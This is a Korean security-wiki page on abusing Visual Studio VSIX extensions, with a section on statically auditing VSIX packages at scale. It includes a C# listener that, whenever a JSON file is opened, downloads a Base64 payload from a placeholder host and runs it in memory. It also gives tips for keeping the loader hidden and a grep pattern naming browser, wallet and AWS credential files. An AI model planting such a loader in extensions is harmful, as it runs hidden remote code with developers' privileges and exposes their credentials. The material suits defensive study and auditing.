# Visual Studio VSIX Extension 악용

{{#include ../banners/hacktricks-training.md}}

Visual Studio extension을 이용하면 일상적인 편집기 작업 중에 로그인한 사용자의 ID로 코드가 실행될 수 있습니다. 악성 VSIX, 유사한 이름을 사용하는 게시자 또는 침해된 확장 업데이트를 통해 정상적인 설치 경로로 사용자에게 도달할 수 있습니다. 관리자 권한 프롬프트를 거치는 설치는 사용자가 동의한 설치 경로이지, 자동 권한 상승이 아닙니다.<sup>[[1]](#references)</sup>

## 실행 모델

기존 VSSDK 확장은 일반적으로 `devenv.exe` 내부에서 실행됩니다. 최신 `VisualStudio.Extensibility` 모델은 주로 최신 .NET 확장을 프로세스 외부에서 실행합니다. Visual Studio가 전용 `Microsoft.ServiceHub.Host.Extensibility` 프로세스에 호출을 중계해 IDE 안정성을 유지하지만, **확장을 사용자의 Windows 권한으로부터 격리하는 샌드박스를 제공하지는 않습니다**. 실제 실행 파일 이름에는 `ServiceHub.Host.Extensibility.arm64.exe`와 같은 아키텍처 접미사가 포함될 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

### 일반적인 편집기 작업 시 트리거

눈에 띄는 메뉴 명령만 제공하는 대신, 확장은 `ITextViewOpenClosedListener`를 구현할 수 있습니다. `TextViewOpenedAsync` 콜백은 일치하는 문서가 열릴 때 호출되며, `TextViewExtensionConfiguration.AppliesTo`를 사용하면 JSON처럼 흔히 쓰이는 형식으로 활성화 대상을 제한할 수 있습니다. 실제 포매터나 린터는 광고한 기능을 수행하면서 파일을 여는 동작의 부수 효과로 두 번째 작업을 실행할 수도 있습니다.<sup>[[1]](#references)[[3]](#references)</sup>

다음의 축약된 패턴은 주요 실행 지점을 보여줍니다. 설명을 간결하게 하기 위해 정당한 포매터와 오류 처리는 생략했습니다.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>이벤트 트리거 방식의 메모리 내 관리형 어셈블리 로더</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

이 체인은 Base64 텍스트를 다운로드하고, 이를 디코딩해 assembly 바이트로 변환한 다음, collectible `AssemblyLoadContext`를 통해 `MemoryStream`에서 로드하고, 리플렉션으로 가져온 `EntryPoint`를 매개변수가 없거나 `string[]`을 받는 형태로 호출한 뒤, 비동기 진입점을 기다리고 컨텍스트를 언로드합니다. 두 번째 단계는 디스크에 기록되지 않지만, VSIX와 기본 확장 DLL은 디스크 흔적을 남깁니다. Base64는 진위성이나 기밀성을 제공하지 않습니다. HTTP를 사용하면 경로상의 공격자가 응답을 바꿔치기할 수도 있습니다.<sup>[[1]](#references)</sup>

운영 방식의 변형으로는 스테이징에 실패해도 광고된 기능이 계속 작동하도록 모든 예외를 무시하거나, 편집 후 트리거되도록 `ITextViewChangedListener`를 사용하는 방법이 있습니다. 코드는 extension host에서 실행되며, 해당 사용자가 사용할 수 있는 managed API, P/Invoke, 파일, 자격 증명 및 자식 프로세스를 이용할 수 있습니다.<sup>[[1]](#references)</sup>

native plugin autoloading을 기반으로 한 관련 편집기 전용 실행 표면은 다음을 참조하세요.

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Marketplace 및 배포 신뢰 악용

VSIX는 직접 공유되거나 피싱을 통해 전달될 수 있으며, 웹 Marketplace 또는 Visual Studio에 내장된 Marketplace 브라우저에서 받을 수도 있습니다. 주로 고유성과 예약어 목록만 확인하는 publisher 등록 절차는 시각적으로 유사한 publisher ID를 허용할 수 있습니다. 이미 신뢰받는 publisher 또는 extension을 침해하면 설치된 사용자 기반을 물려받으므로 더욱 효과적입니다. Marketplace에서 설치하면 Visual Studio Installer가 실행되고, 다운로드한 VSIX는 일시적으로 `%LOCALAPPDATA%\Temp`에 저장됩니다. `payload.vsix`도 정상적으로 사용되므로 파일명만으로는 침해 지표가 되지 않습니다.<sup>[[1]](#references)</sup>

MDSec은 extension을 직접 설치하는 Visual Studio URL protocol을 확인하지 못했습니다. 따라서 공격자는 여전히 사용자에게 VSIX를 설치하고 신뢰하도록 유도하거나, 기존 extension의 배포 경로를 침해해야 합니다. `AllUsers` 패키지는 Visual Studio 설치 폴더에 설치되며 승격을 요청할 수 있지만, 이는 일반적인 사용자 동의 기반 설치 동작이지 관리자 또는 SYSTEM 권한을 자동으로 얻는 경로가 아닙니다.<sup>[[1]](#references)[[4]](#references)</sup>

### 대규모 정적 감사

VSIX 패키지는 보통 ZIP 컨테이너이므로, 안전한 Marketplace 검토 파이프라인에서는 패키지를 열거하고 **extension 코드를 로드하지 않은 채** 압축을 풀고, manifest를 파싱하고, 실행 표면을 식별한 다음, `ilspycmd`로 managed assembly를 디컴파일할 수 있습니다. 일반적인 번들 종속성을 제외한 뒤 extension이 소유한 assembly를 우선 조사하고, 자격 증명 저장소와 관련된 문자열을 파일 읽기와 네트워크 전송, 인코딩과 전송, 다운로드와 실행, 자격 증명 관리자와 네트워크 접근, 스크린샷과 전송 같은 동작 조합과 대조합니다.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

또한 모든 실행 영역이 managed code라고 가정하지 말고 native DLL, MSBuild targets, scripts, T4 templates, installer payloads도 조사하세요. 의심스러운 동작을 manifest에 명시된 목적과 비교하세요. telemetry와 합법적인 updaters도 데이터 유출이나 staging처럼 보일 수 있습니다. 정적 분석만으로는 packed, obfuscated, dynamically resolved, dormant code를 놓칠 수 있으며, 최신 버전만 검토하면 과거의 악성 릴리스도 놓칠 수 있습니다.<sup>[[1]](#references)</sup>

## References

- [1] [MDSec - Visual Studio Extensions 재검토](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - VisualStudio.Extensibility 소개](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - VSIX 패키지의 구조](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - ilspycmd .NET 도구](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
{{#include ../banners/hacktricks-training.md}}
